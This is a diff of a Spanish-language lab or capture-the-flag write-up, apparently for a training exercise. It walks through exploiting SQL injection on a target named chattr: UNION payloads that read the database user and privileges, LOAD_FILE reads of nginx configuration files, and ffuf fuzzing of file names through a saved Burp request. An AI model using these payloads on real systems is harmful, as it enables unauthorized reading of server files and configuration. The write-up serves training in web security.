@@ -151,11 +151,105 @@ xd') union select 1,2,Password,4 from Users where Username="admin"-- -
 **Respuesta:** `/var/www/chattr-prod`
 
 #### Procedimiento:
-Para descubrir la ruta raíz:
-* Forzamos un error en la base de datos o leímos un archivo del sistema usando `LOAD_FILE()`:
-  ```sql
-  ' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3-- -
-  ```
+
+1. Primero revisemos nuestro usuario actual para ver si tenemos algun privilegio que nos pueda servir para leer y, tal vez, escribir archivos:
+
+```
+xd') union select 1,2,user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+![usuario](imgs/usuario.pn)
+
+Estamos como `chattr_dbUser@localhost`
+
+2. Ahora revisemos nuestros privilegios
+
+```
+xd') UNION SELECT 1, 2, privilege_type, grantee FROM information_schema.user_privileges-- -
+```
+![privilegios](imgs/privilegios.png)
+
+El privilegio FILE en MySQL permite lectura a los archivos de MySQL.
+
+3. Leer archivos de configuración 
+para encontrar información sobre el servidor. Podemos intentar leer los archivos de configuración de Apache y/o Nginx en sus ubicaciones predeterminadas.
+
+Intentemos con nginx:
+```
+xd' ) UNION SELECT 1 , 2 , LOAD_FILE ( "/etc/nginx/nginx.conf" ), 4-- -
+```
+![nginx](imgs/nginx.png)
+
+Nos dice que las configuraciones están dentro de /etc/nginx/sites-enabled/directory.
+
+4. Guardemos el GET
+
+Primero activemos el interceptor en burp suite y despues escribamos esto en la pagina:
+```
+xd') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/test'),4-- -
+```
+Obtenemos el Method Get en Burp Suite.
+En el `GET` cambiamos test por FUZZ para que quede asi:
+`GET /index.php?q=xd%27%29+union+select+1%2C2%2CLOAD_FILE%28%27%2Fetc%2Fnginx%2Fsites-enabled%2FFUZZ%27%29%2C4--+-&u=1 HTTP/1.1`
+
+Despues, guardamos el archivo con el nombre `conf.req`
+
+![save](imgs/save.png)
+
+5. Usemos FUZZ:
+
+Una vez tenemos guardado el archivo. Podemos verificarlo con el comando `cat`:
+```
+┌──(kali㉿kali)-[~]
+└─$ cat conf.req 
+GET /index.php?q=xd%27%29+union+select+1%2C2%2CLOAD_FILE%28%27%2Fetc%2Fnginx%2Fsites-enabled%2FFUZZ%27%29%2C4--+-&u=1 HTTP/1.1
+Host: 154.57.164.69:32051
+Cookie: PHPSESSID=5lonlmtq2rjt155bi5u6s5j2bm
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://154.57.164.69:32051/index.php?q=xd%27%29+union+select+1%2C2%2CLOAD_FILE%28%27%2Fetc%2Fnginx%2Fsites-enabled%2Ftest%27%29%2C4--+-&u=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+```
+
+Ahora usaremos fuzz:
+```
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -request conf.req -t 300
+```
+
+Y nos va a aparecer un monton de resultados
+
+![fuzz](imgs/fuzz.png)
+
+Nos damos cuenta que la mayoria dice: `Size: 5372`. Entonces, podemos filtrar ese tamaño:
+```
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -request conf.req -t 300 -fs 5372
+```
+
+Y obtenemos `default`
+
+![default](imgs/default.png)
+
+6. Regresemos a la pagina y pongamos:
+
+`xd') union select 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -`
+
+Obtenemos:
+
+![respuesta2](imgs/answer2.png)
+
+
+
 
 ---
 
